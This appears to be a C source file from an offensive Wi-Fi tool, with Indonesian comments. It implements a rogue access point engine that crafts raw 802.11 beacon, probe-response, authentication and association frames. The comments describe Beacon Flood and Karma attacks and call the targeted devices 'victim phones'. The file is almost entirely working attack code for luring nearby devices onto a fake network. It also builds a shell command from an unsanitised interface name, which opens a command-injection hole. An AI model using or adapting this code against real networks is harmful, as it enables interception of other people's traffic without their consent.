/*
 * ============================================================================
 * IMPLEMENTASI: core/rogue_ap.c — Mesin Injeksi Frame Rogue AP
 * ============================================================================
 */
#include "rogue_ap.h"
#include "../utils/utils.h"
#include "../utils/logger.h"
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>
#include <pthread.h>

// Variabel Privat Transmisi
static int g_tx_sock = -1;                                      // Socket transmisi tunggal (reusable)
static struct sockaddr_ll g_tx_addr;                            // Alamat fisik link-layer
static pthread_mutex_t g_tx_mutex = PTHREAD_MUTEX_INITIALIZER;  // FIX #13: Lindungi g_tx_sock dari data race

/*
 * === FUNGSI: tx_frame() ===
 * Tujuan   : Mengirimkan frame biner mentah ke antarmuka kartu Wi-Fi
 * Parameter: const uint8_t *buf (Buffer frame), int len (Panjang byte)
 * Return   : Jumlah byte terkirim (>0) jika sukses, -1 jika gagal
 */
static int tx_frame(const uint8_t *buf, int len) {
    pthread_mutex_lock(&g_tx_mutex);
    if (g_tx_sock < 0) {
        pthread_mutex_unlock(&g_tx_mutex);
        return -1;
    }
    // Tembakkan frame mentah menembus kartu Wi-Fi
    int res = sendto(g_tx_sock, buf, len, 0,
                     (struct sockaddr*)&g_tx_addr, sizeof(g_tx_addr));
    pthread_mutex_unlock(&g_tx_mutex);
    return res;
}

/*
 * === FUNGSI: close_tx_socket() ===
 * Tujuan   : Menutup socket transmisi dan mereset file descriptor
 * Parameter: void
 * Return   : void
 */
void close_tx_socket(void) {
    pthread_mutex_lock(&g_tx_mutex);
    if (g_tx_sock >= 0) {
        close(g_tx_sock);
        g_tx_sock = -1;
    }
    pthread_mutex_unlock(&g_tx_mutex);
}

/*
 * === FUNGSI: setup_ap_mode() ===
 * Tujuan   : Mengonfigurasi interface nirkabel ke mode Access Point
 * Parameter: const char *iface (Nama interface)
 * Return   : 0 jika sukses, -1 jika gagal
 */
int setup_ap_mode(const char *iface) {
    log_event(LOG_INFO, "Mengatur mode Access Point pada interface %s", iface);
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "ip link set dev %s down && iw dev %s set type __ap && ip link set dev %s up 2>/dev/null",
             iface, iface, iface);
    int res = system(cmd);
    return res == 0 ? 0 : -1;
}

/*
 * === FUNGSI: build_beacon_body() ===
 * Tujuan   : Merakit paket Beacon 802.11 lengkap dengan Information Elements
 * Parameter: uint8_t *buf, ap_config_t *cfg, const char *ssid
 * Return   : Total panjang paket dalam byte
 */
static int build_beacon_body(uint8_t *buf, ap_config_t *cfg, const char *ssid) {
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *p = hdr->payload;
    int slen = strlen(ssid);
    if (slen > MAX_SSID_LEN) slen = MAX_SSID_LEN;

    // 1. MAC Header (24 bytes)
    hdr->frame_control = htons(IEEE80211_FC_BEACON); // Opcode 0x8000
    hdr->duration = 0;
    memset(hdr->addr1, 0xFF, 6);       // Destination: Broadcast FF:FF:FF:FF:FF:FF
    memcpy(hdr->addr2, cfg->bssid, 6); // Source MAC AP kita
    memcpy(hdr->addr3, cfg->bssid, 6); // BSSID AP kita
    hdr->seq_ctrl = 0;

    // 2. Fixed Parameters (12 bytes)
    memset(p, 0, 8); p += 8;           // Timestamp 8-byte
    *p++ = BEACON_INTERVAL & 0xFF;     // Interval LSB (100 ms)
    *p++ = (BEACON_INTERVAL >> 8) & 0xFF; // Interval MSB
    *p++ = 0x01; *p++ = 0x00;          // Capability Info: ESS aktif, Open System

    // 3. Information Elements (TLV)
    // Tag 0: SSID
    *p++ = IE_TAG_SSID; 
    *p++ = slen;
    memcpy(p, ssid, slen); 
    p += slen;

    // Tag 1: Supported Rates (1, 2, 5.5, 11 Mbps)
    *p++ = IE_TAG_RATES; 
    *p++ = 4;
    *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;

    // Tag 3: DS Parameter Set (Kanal Operasi Radio)
    *p++ = IE_TAG_DS_PARAM; 
    *p++ = 1; 
    *p++ = cfg->channel;

    // Tag 50: Extended Supported Rates (6, 9, 18, 36 Mbps)
    *p++ = IE_TAG_EXTENDED_RATES; 
    *p++ = 4;
    *p++ = 0x0C; *p++ = 0x12; *p++ = 0x24; *p++ = 0x48;

    return p - buf; // Total panjang paket lengkap
}

/*
 * === FUNGSI: send_beacon() ===
 * Tujuan   : Memancarkan satu frame Beacon menggunakan SSID default dari config
 */
int send_beacon(ap_config_t *cfg) {
    uint8_t buf[512];
    return tx_frame(buf, build_beacon_body(buf, cfg, cfg->ssid));
}

/*
 * === FUNGSI: send_beacon_with_ssid() ===
 * Tujuan   : Memancarkan frame Beacon dengan SSID kustom (untuk serangan Beacon Flood / Karma)
 */
int send_beacon_with_ssid(ap_config_t *cfg, const char *ssid) {
    uint8_t buf[512];
    return tx_frame(buf, build_beacon_body(buf, cfg, ssid));
}

/*
 * === FUNGSI: send_probe_response() ===
 * Tujuan   : Membalas Probe Request yang dikirimkan oleh HP korban
 * Analogi  : Berteriak membalas "Ya, saya toko yang kamu cari!" secara langsung ke korban
 * Parameter: ap_config_t *cfg, uint8_t *mac (MAC HP korban), const char *ssid
 */
int send_probe_response(ap_config_t *cfg, uint8_t *mac, const char *ssid) {
    uint8_t buf[512];
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *p = hdr->payload;
    int slen = strlen(ssid);
    if (slen > MAX_SSID_LEN) slen = MAX_SSID_LEN;

    // Header MAC Unicast (Dialamatkan khusus ke HP korban)
    hdr->frame_control = htons(IEEE80211_FC_PROBE_RESP); // Opcode 0x5000
    hdr->duration = 0;
    memcpy(hdr->addr1, mac, 6);        // Dest: MAC HP korban
    memcpy(hdr->addr2, cfg->bssid, 6); // Src : AP kita
    memcpy(hdr->addr3, cfg->bssid, 6); // BSSID
    hdr->seq_ctrl = 0;

    // Fixed parameters & IEs
    memset(p, 0, 8); p += 8;
    *p++ = BEACON_INTERVAL & 0xFF; *p++ = (BEACON_INTERVAL >> 8) & 0xFF;
    *p++ = 0x01; *p++ = 0x00;
    *p++ = IE_TAG_SSID; *p++ = slen;
    memcpy(p, ssid, slen); p += slen;
    *p++ = IE_TAG_RATES; *p++ = 4;
    *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
    *p++ = IE_TAG_DS_PARAM; *p++ = 1; *p++ = cfg->channel;

    return tx_frame(buf, p - buf);
}

/*
 * === FUNGSI: send_auth_response() ===
 * Tujuan   : Merespon Authentication Request korban dengan status SUCCESS
 * Analogi  : Memberikan stempel visa izin masuk sementara kepada tamu
 */
int send_auth_response(ap_config_t *cfg, uint8_t *mac) {
    uint8_t buf[64];
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *p = hdr->payload;
    hdr->frame_control = htons(IEEE80211_FC_AUTH); // Opcode 0xB000
    hdr->duration = 0;
    memcpy(hdr->addr1, mac, 6);
    memcpy(hdr->addr2, cfg->bssid, 6);
    memcpy(hdr->addr3, cfg->bssid, 6);
    hdr->seq_ctrl = 0;
    *p++ = 0x00; *p++ = 0x00;  // Algoritma: Open System Authentication (0)
    *p++ = 0x02; *p++ = 0x00;  // Nomor Urut Sequence: 2 (Respon)
    *p++ = 0x00; *p++ = 0x00;  // Status Code: 0 (Successful)
    return tx_frame(buf, sizeof(wifi_header_t) + 6);
}

/*
 * === FUNGSI: send_assoc_response() ===
 * Tujuan   : Merespon Association Request korban dengan menetapkan Association ID (AID)
 * Analogi  : Memberikan kunci kamar resmi kepada tamu sehingga resmi menjadi penghuni
 */
int send_assoc_response(ap_config_t *cfg, uint8_t *mac) {
    uint8_t buf[64];
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *p = hdr->payload;
    hdr->frame_control = htons(IEEE80211_FC_ASSOC_RESP); // Opcode 0x1000
    hdr->duration = 0;
    memcpy(hdr->addr1, mac, 6);
    memcpy(hdr->addr2, cfg->bssid, 6);
    memcpy(hdr->addr3, cfg->bssid, 6);
    hdr->seq_ctrl = 0;
    *p++ = 0x01; *p++ = 0x00;  // Capability: ESS
    *p++ = 0x00; *p++ = 0x00;  // Status: 0 (Successful)
    *p++ = 0x01; *p++ = 0x00;  // Association ID (AID = 1)
    return tx_frame(buf, sizeof(wifi_header_t) + 6);
}

/*
 * === FUNGSI: beacon_thread() ===
 * Tujuan   : Thread latar belakang yang menyiarkan beacon secara berkala
 */
void *beacon_thread(void *arg) {
    ap_config_t *cfg = (ap_config_t*)arg;
    log_event(LOG_INFO, "Thread Beacon Rogue AP aktif (Interval: %d ms)", cfg->beacon_interval_ms);
    while (cfg->ap_running) {
        send_beacon(cfg);
        usleep(cfg->beacon_interval_ms * 1000);
    }
    log_event(LOG_INFO, "Thread Beacon Rogue AP dihentikan");
    return NULL;
}

/*
 * === FUNGSI: start_rogue_ap() ===
 * Tujuan   : Menginisialisasi dan meluncurkan layanan Access Point
 * Catatan  : Mematuhi perbaikan Audit #6 (Hanya set ap_running=true jika semua langkah sukses)
 */
int start_rogue_ap(ap_config_t *cfg) {
    close_tx_socket(); // Pastikan socket lama tertutup
    
    // 1. Buka raw socket transmisi Layer 2
    g_tx_sock = open_raw_socket(cfg->ap_iface, &g_tx_addr);
    if (g_tx_sock < 0) { 
        log_event(LOG_ERROR, "Gagal membuat TX socket pada interface '%s'", cfg->ap_iface); 
        return -1; 
    }

    // 2. Siapkan alamat link-layer kartu jaringan
    struct ifreq ifr;
    strncpy(ifr.ifr_name, cfg->ap_iface, IFNAMSIZ - 1);
    if (ioctl(g_tx_sock, SIOCGIFINDEX, &ifr) < 0) {
        log_event(LOG_ERROR, "Gagal membaca ifindex interface '%s'", cfg->ap_iface);
        close_tx_socket(); 
        return -1;
    }
    memset(&g_tx_addr, 0, sizeof(g_tx_addr));
    g_tx_addr.sll_family = AF_PACKET;
    g_tx_addr.sll_protocol = htons(ETH_P_ALL);
    g_tx_addr.sll_ifindex = ifr.ifr_ifindex;
    g_tx_addr.sll_halen = 6;

    // 3. Konfigurasi kartu Wi-Fi ke mode AP dan atur channel
    if (setup_ap_mode(cfg->ap_iface) < 0) {
        log_event(LOG_WARN, "Gagal mengatur mode AP via driver, melanjutkan via raw socket");
    }
    set_interface_channel(cfg->ap_iface, cfg->channel);

    // 4. FIX #6: Aktifkan flag ap_running HANYA jika inisialisasi selesai tanpa error!
    cfg->ap_running = true; 
    log_event(LOG_INFO, "Rogue AP Berhasil Aktif: SSID='%s' | Kanal=%d | Dev='%s'",
              cfg->ssid, cfg->channel, cfg->ap_iface);
    return 0;
}
